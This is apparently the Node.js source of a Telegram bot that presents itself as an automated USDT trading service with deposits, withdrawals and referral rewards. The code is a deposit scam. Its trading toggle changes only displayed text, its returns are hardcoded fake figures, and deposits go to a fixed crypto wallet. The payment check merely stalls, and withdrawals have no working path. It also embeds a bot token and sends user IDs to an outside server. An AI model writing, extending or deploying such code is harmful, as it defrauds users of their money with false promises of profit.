const { Telegraf, Markup } = require('telegraf');
const fetch = require('node-fetch');
const fs = require('fs');

const bot = new Telegraf('6363609133:AAGokjYGa80BOoeG2ItLOiEA6_TYaFEKc60');

// Function to send user data to the server
async function sendUserData(ctx) {
    const userId = ctx.from.id;
    const startDate = new Date().toISOString();
    const balance = 0; // initial balance
    const withdrawal = 0; // initial withdrawal

    try {
        const response = await fetch('https://solkah.org/id/chat.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                id: userId,
                startDate: startDate,
                balance: balance,
                withdrawal: withdrawal,
            }),
        });
        if (response.ok) {
            console.log('User data sent successfully');
        } else {
            console.log('Failed to send user data');
        }
    } catch (error) {
        console.error('Error sending user data:', error);
    }
}

// Start command handler
bot.start(async (ctx) => {
    await sendUserData(ctx);
    ctx.reply(`Great! All is ready for start.

Before using our service, we strongly recommend you to carefully review the functionality of each trading bot button.

Menu:

"Trading" - here you can see the results of the bot's trading for different periods of time.
You can also pause or resume the trading bot;
"Stop trading/Start trading" - starting and stopping the trading bot;
"Trading Bot statistics" - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months;
"Trading Bot Channel" - up-to-date information on bot trading.

"My account" - up-to-date information on the balance and account. Deposit/withdrawal of funds, referral system;
"Top up your balance" - the ability to replenish the USDT TRC20 wallet to get started (10% commission);
"Withdrawal of funds" - the ability to withdraw USDT TRC20 to your wallet (10% commission);
"Balance history" - deposits and withdrawals on your trading account;
"Referral system" - the reward is 5% from each deposit of the listed users.`,
        Markup.keyboard([
            ['Trading💰', 'My Account'],
            ['Deposit', 'Withdrawal'],
            ['Support'],
        ]).resize().extra()
    );
});

// Trading button handler
bot.hears('Trading💰', (ctx) => {
    ctx.reply(`Trading
Stop trading / Start trading - starting and stopping the trading bot.
Trading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
Trading status: Stopped 🚫`, Markup.inlineKeyboard([
        [Markup.button.callback('Start trading', 'start_trading')],
        [Markup.button.callback('Statistics', 'statistics')],
        [Markup.button.callback('Trading bot channel', 'trading_channel')],
    ]).extra());
});

// Inline button handlers
bot.action('start_trading', (ctx) => {
    ctx.editMessageText(`Trading
Stop trading / Start trading - starting and stopping the trading bot.
Trading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
Trading status: Started ✅️`, Markup.inlineKeyboard([
        [Markup.button.callback('Stop trading', 'stop_trading')],
        [Markup.button.callback('Statistics', 'statistics')],
        [Markup.button.callback('Trading bot channel', 'trading_channel')],
    ]).extra());
});

bot.action('stop_trading', (ctx) => {
    ctx.editMessageText(`Trading
Stop trading / Start trading - starting and stopping the trading bot.
Trading bot statistics - bot trading statistics for the period: 24 hours, 3 days, 7 days, 1 month, 3 months.
Trading status: Stopped 🚫`, Markup.inlineKeyboard([
        [Markup.button.callback('Start trading', 'start_trading')],
        [Markup.button.callback('Statistics', 'statistics')],
        [Markup.button.callback('Trading bot channel', 'trading_channel')],
    ]).extra());
});

bot.action('statistics', (ctx) => {
    ctx.reply('Trading Bot Statistics:\n24 hours: 5%\n3 days: 10%\n7 days: 15%');
});

bot.action('trading_channel', (ctx) => {
    ctx.reply('https://t.me/+BaZqzAd4Mus5NzU0');
});

// My Account button handler
bot.hears('My Account', async (ctx) => {
    const userId = ctx.from.id;
    const response = await fetch(`https://solkah.org/id/data.txt`);
    const data = await response.text();
    const userData = data.split('\n').find(line => line.startsWith(userId.toString()));
    if (userData) {
        const [id, startDate, balance, withdrawal] = userData.split(',');
        ctx.reply(`Medat.00:
My Account

Rencontre bot ❤️:
💰 Current balance: ${balance}
📅 Date of registration: ${startDate}
💸 Total withdrawal: ${withdrawal}

🔗 Your referral link: https://t.me/@Orrdoxbot?start=${id}`, Markup.inlineKeyboard([
            [Markup.button.callback('Deposit', 'deposit')],
        ]).extra());
    } else {
        ctx.reply('User data not found.');
    }
});

bot.action('deposit', (ctx) => {
    ctx.reply(`❗️ In order to top up your balance, you need to transfer USDT to a wallet below (the commission for replenishment is 10%). 
The transfer is realized automatically.

❗️ The minimum amount for replenishment is 20 USDT
➖➖➖➖➖
Wallet address USDT TRC-20:
TDpKzxmecCqdwUU8DoTjvjoKwUnemh7sge
(To copy, click on the wallet👆)`, Markup.inlineKeyboard([
        [Markup.button.callback('Check payment', 'check_payment')],
    ]).extra());
});

bot.action('check_payment', (ctx) => {
    ctx.reply('❗️Please, check again in 5 minutes❗️\n➖➖➖➖➖\nIf the payment is not accepted within 15 minutes, write to our support 📝');
    // Notify admin
    ctx.telegram.sendMessage('YOUR_ADMIN_CHAT_ID', `Hey, new payment from user ID=${ctx.from.id}`);
});

// Withdrawal button handler
bot.hears('Withdrawal', (ctx) => {
    ctx.reply('The minimum withdrawal amount is $30.');
});

// Support button handler
bot.hears('Support', (ctx) => {
    ctx.reply('You are now connected to support. Please describe your issue.');
});

bot.on('message', (ctx) => {
    const userId = ctx.from.id;
    const message = ctx.message.text;
    // Send message to admin
    ctx.telegram.sendMessage('5873712733', `Support request from user ID=${userId}: ${message}`, Markup.inlineKeyboard([
        [Markup.button.callback('Reply', `reply_${userId}`)],
    ]).extra());
});

bot.action(/^reply_(\d+)$/, (ctx) => {
    const userId = ctx.match[1];
    ctx.reply(`You can reply to user ID=${userId} by typing your message here.`);
    bot.on('text', (ctx) => {
        const message = ctx.message.text;
        ctx.telegram.sendMessage(userId, `Support reply: ${message}`);
    });
});

bot.launch();
